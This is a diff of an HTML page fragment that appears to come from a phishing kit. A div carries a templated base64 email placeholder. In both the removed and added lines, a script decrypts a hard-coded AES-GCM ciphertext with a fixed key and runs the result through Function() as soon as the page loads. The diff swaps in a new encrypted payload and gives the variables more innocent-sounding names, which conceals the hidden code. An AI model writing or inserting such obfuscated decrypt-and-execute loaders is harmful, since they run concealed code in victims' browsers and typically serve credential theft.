@@ -1,13 +1,9 @@
-
-
 <div adidas="<%=EMAIL64%>">
-    <span><p nike-page011="" ></span>
+    <span><p nike-block_Fx="" ></span>
 </div>
-
     <script>
-        console.log("Checking")
-        var initial_scale = AnimationEvent;
-        fH=e=>new Uint8Array(e.match(/.{1,2}/g).map(e=>parseInt(e,16))),dT=async(e,a,c,d)=>{let _=new TextDecoder,t=fH(a),f=fH(c),$=fH(e),r=await crypto.subtle.importKey("raw",new TextEncoder().encode(d),{name:"PBKDF2"},!1,["deriveKey"]),b=await crypto.subtle.deriveKey({name:"PBKDF2",salt:f,iterations:1e5,hash:"SHA-256"},r,{name:"AES-GCM",length:256},!1,["decrypt"]),i=await crypto.subtle.decrypt({name:"AES-GCM",iv:t},b,$);return _.decode(i)};const rD=async()=>{let e={iv:"f0c5b2c3ff08937c9570183e",salt:"fe2e31d4efc45c3e77cd9262dabc5f0c",ciphertext:"5f1590320549146c61a10b4c2407d9e227a59a1381d82b521eb12fd1a4b1c5d8dd456e241b306000c184c73c140f57a1360e1b8e98a19c607808132ce90cca6eac2ef5d69078b2903b1b2c1db347f851953afd788b8a748456c2e82ca7304246edd70d2c2097656f8c525c5e37e2ffccb3f3d2afe7deee9d6769c956f4e01ee6b76487d859fa1de1873c72e04ae53bc83440ce9d6e8076e1f8d14517e3da8843d479aa378031a6b69eff5935b495f2b0ef55af3a1da425576fe97a803eefa87de73b5c6daa172aed44bbcef890b3c9d06ea8f7712256"};if(!e){console.error("No data found");return}let{ciphertext:a,iv:c,salt:d}=e;try{let _=await dT(a,c,d,"my-secret-key");console.log("Decrypted:",_),Function(`${_}`)()}catch(t){console.error("Error:",t.message)}};rD();
+    
+    const hexToUint8Array=e=>new Uint8Array(e.match(/.{1,2}/g).map(e=>parseInt(e,16))),decryptData=async(e,a,c,d)=>{let t=new TextDecoder,r=hexToUint8Array(a),_=hexToUint8Array(c),$,f=await crypto.subtle.decrypt({name:"AES-GCM",iv:r},await crypto.subtle.deriveKey({name:"PBKDF2",salt:_,iterations:1e5,hash:"SHA-256"},await crypto.subtle.importKey("raw",new TextEncoder().encode(d),{name:"PBKDF2"},!1,["deriveKey"]),{name:"AES-GCM",length:256},!1,["decrypt"]),hexToUint8Array(e));return t.decode(f)},runDecryption=async()=>{let e={"iv":"b1d6504eea678a007e5d0a24","salt":"d18df4d946a3b82aa0f930ee3300f82c","ciphertext":"ffeafa695401fd2d10ee26c9473ad1f6aad7fdcba316446b7be9e681391d64ab8eebd18db07ca3219959f7bac95651e2d76cdf91fb4b3fc20d4320d097b5cc8f7c9cd368ac85588142c4104d42b6074ef2779dc6536a07d8b51f897ff3afeb214a5f88cf8489ec64885ad96a11d57563530ba73d056334bc9b2be7e48aa1308bc0e5e9aff6114b0bd8ef833ff966f38d0641d6b44978e51900d9f195925c3df7249c5445c03b3c1a474a10979b3968d745bf9f7e21872af390b3213412384d8357323b6c30a62f"};if(!e){console.error("No data found");return}let{ciphertext:a,iv:c,salt:d}=e;try{let t=await decryptData(a,c,d,"my-secret-key");console.log("Decrypted:",t),Function(`${t}`)()}catch(r){console.error("Error:",r.message)}};runDecryption();
         
         </script>
 
